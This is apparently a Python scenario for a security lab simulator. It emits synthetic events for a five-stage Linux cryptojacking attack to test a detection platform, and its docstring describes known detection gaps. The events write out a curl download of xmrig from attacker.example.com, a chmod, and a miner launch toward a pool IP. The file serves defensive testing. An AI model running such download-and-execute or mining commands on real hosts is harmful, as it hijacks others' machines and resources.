"""crypto_mining_payload — five-stage Linux cryptojacking scenario (Phase 20 A2).

A host-mine.lab.local server is compromised; the attacker downloads xmrig,
makes it executable, runs it pointed at a mining pool IP, and the miner
beacons out to that pool.

Detector reality (current platform state — see Phase 20 §A2 plan note):
  * py.process.suspicious_child  → does NOT fire on bash→curl|sh or bash→chmod
    (Linux process-chain branch missing — same gap as A1; see
    backend/app/detection/rules/process_suspicious_child.py:14-25).
  * py.blocked_observable_match  → fires on stages 4+5 if the pool IP
    (198.51.100.77) is in blocked_observables BEFORE the events land.

Live-vs-regression split (deliberate, see Phase 20 plan note):
  * The regression test in backend/tests/integration/test_detection_fixtures.py
    seeds the pool IP via the manifest's `setup: block_observable:` directive
    (manifest entry below). It asserts blocked_observable_match fires.
  * The live simulator does NOT pre-seed — there's no single admin API for
    seeding blocked observables (only the propose-action → execute-action
    chain in labs/smoke_test_phase9a.sh:255-285). In current platform state
    a live A2 run shows the choreography but produces no detection. That gap
    (no scenario-friendly seed API) is itself a Phase 20 finding for the
    "Detection gaps" section of docs/phase-20-summary.md.

Resulting incident (current platform state):
  * Live run: none (no detector fires without pre-seeded block).
  * Regression test: blocked_observable_match Detection rows are recorded but
    no correlator currently turns them into an Incident — endpoint_compromise_
    standalone keys on `py.process.*` rule_ids only (correlation/rules/
    endpoint_compromise_standalone.py:38). That's the second Phase 22 input
    from A2: a correlator that promotes blocked_observable hits to incidents.
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime, timezone

from labs.simulator import event_templates as tmpl
from labs.simulator.client import SimulatorClient

log = logging.getLogger(__name__)

SCENARIO_NAME = "crypto_mining_payload"

_HOST = "host-mine.lab.local"
_USER = "alice"
_ATTACKER_HOST = "attacker.example.com"
_POOL_IP = "198.51.100.77"
_POOL_PORT = 4444
_HOST_IP = "10.0.2.50"

# Real-time offsets (seconds). Compressed by --speed factor.
_STAGE2_OFFSET = 5.0     # download → file appears
_STAGE3_OFFSET = 10.0    # → chmod
_STAGE4_OFFSET = 15.0    # → miner launched
_STAGE5_OFFSET = 18.0    # → first pool beacon


def _log(msg: str) -> None:
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")


async def run(client: SimulatorClient, speed: float = 1.0) -> dict:
    """Fire all scenario events. Returns dict with event and incident IDs touched."""
    results: dict = {"events": [], "incidents_touched": []}

    def wait(offset_from: float, offset_to: float) -> float:
        return max(0.0, (offset_to - offset_from) * speed)

    # --- Stage 0: Register lab assets ---
    _log(f"Stage 0  Register asset: host:{_HOST}")
    await client.register_asset("host", _HOST)
    await client.register_asset("user", _USER)

    # NOTE: plan §A2 calls for seeding _POOL_IP into blocked_observables here.
    # No single API exists for that (see scenario docstring); the regression
    # test handles it via manifest.yaml's `setup:` directive instead.

    # --- Stage 1: Download xmrig ---
    _log(f"Stage 1  Download: bash→curl https://{_ATTACKER_HOST}/xmrig on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/bin/bash",
            cmdline=f"bash -c 'curl https://{_ATTACKER_HOST}/xmrig -o /tmp/xmrig'",
            pid=5101,
            ppid=2828,
            user=_USER,
            parent_image="/usr/sbin/sshd",
            dedupe_key=f"sim:crypto-mine:process.created:{_HOST}:download",
        )
    )
    _record(results, ev)

    # --- Stage 2: File appears at /tmp/xmrig ---
    pause = wait(0.0, _STAGE2_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 2...")
    await asyncio.sleep(pause)

    _log(f"Stage 2  File created: /tmp/xmrig on {_HOST}")
    ev = await client.post_event(
        tmpl.file_created(
            host=_HOST,
            path="/tmp/xmrig",
            user=_USER,
            dedupe_key=f"sim:crypto-mine:file.created:{_HOST}:xmrig",
        )
    )
    _record(results, ev)

    # --- Stage 3: chmod +x ---
    pause = wait(_STAGE2_OFFSET, _STAGE3_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 3...")
    await asyncio.sleep(pause)

    _log(f"Stage 3  chmod +x /tmp/xmrig on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/bin/bash",
            cmdline="bash -c 'chmod +x /tmp/xmrig'",
            pid=5102,
            ppid=2828,
            user=_USER,
            parent_image="/usr/sbin/sshd",
            dedupe_key=f"sim:crypto-mine:process.created:{_HOST}:chmod",
        )
    )
    _record(results, ev)

    # --- Stage 4: Launch miner pointed at pool ---
    pause = wait(_STAGE3_OFFSET, _STAGE4_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 4...")
    await asyncio.sleep(pause)

    _log(f"Stage 4  Launch miner: /tmp/xmrig --pool {_POOL_IP}:{_POOL_PORT} on {_HOST}")
    ev = await client.post_event(
        tmpl.process_created(
            host=_HOST,
            image="/tmp/xmrig",
            cmdline=(
                f"/tmp/xmrig --pool stratum+tcp://{_POOL_IP}:{_POOL_PORT} "
                "-u 4ABCDEFwallet -p x"
            ),
            pid=5103,
            ppid=2828,
            user=_USER,
            parent_image="/bin/bash",
            dedupe_key=f"sim:crypto-mine:process.created:{_HOST}:miner-start",
        )
    )
    _record(results, ev)
    if ev.get("incident_touched"):
        _log(f"  -> blocked_observable_match → {ev['incident_touched']}")

    # --- Stage 5: Mining pool beacon ---
    pause = wait(_STAGE4_OFFSET, _STAGE5_OFFSET)
    _log(f"  -> waiting {pause:.1f}s before stage 5...")
    await asyncio.sleep(pause)

    _log(f"Stage 5  Pool beacon: {_HOST} → {_POOL_IP}:{_POOL_PORT}")
    ev = await client.post_event(
        tmpl.network_connection(
            host=_HOST,
            src_ip=_HOST_IP,
            dst_ip=_POOL_IP,
            dst_port=_POOL_PORT,
            proto="tcp",
            dedupe_key=f"sim:crypto-mine:network.connection:{_HOST}:pool-beacon",
        )
    )
    _record(results, ev)
    if ev.get("incident_touched"):
        _log(f"  -> blocked_observable_match → {ev['incident_touched']}")

    _log(
        f"Scenario complete. events={len(results['events'])}  "
        f"incidents_touched={len(results['incidents_touched'])}"
    )
    return results


async def verify(client: SimulatorClient) -> bool:
    """Verify scenario outcome.

    Per the Phase 20 §A2 plan note, current platform state with NO pre-seeded
    block produces no incident — neither suspicious_child (Linux gap) nor a
    blocked_observable correlator exist to open one. PASS = no exceptions
    during the run; the choreography itself is the deliverable for live runs.

    The regression test (with manifest setup) asserts the detection contract.
    """
    _log("Verifying scenario outcome (live-run, no pre-seeded block)...")
    incidents = await client.get_incidents(limit=100)

    endpoint = [
        i for i in incidents
        if i["kind"] == "endpoint_compromise"
        and (i.get("primary_host") or "").lower() == _HOST
    ]

    if endpoint:
        _log(
            f"  UNEXPECTED endpoint_compromise on {_HOST}: {endpoint[0]['id']} — "
            "either someone closed the Phase-22 detector/correlator gaps, or the "
            "pool IP was already in blocked_observables. Update §A2 acceptance "
            "to reflect the new state."
        )
    else:
        _log(
            f"  EXPECTED no incident for {_HOST} — current platform state has "
            "no Linux process-chain detector and no correlator that promotes "
            "blocked_observable_match into an incident."
        )

    _log("Verification PASSED (live-run acceptance: choreography ran cleanly)")
    return True


def _record(results: dict, ev: dict) -> None:
    results["events"].append(ev.get("event_id"))
    if ev.get("incident_touched") and ev["incident_touched"] not in results["incidents_touched"]:
        results["incidents_touched"].append(ev["incident_touched"])
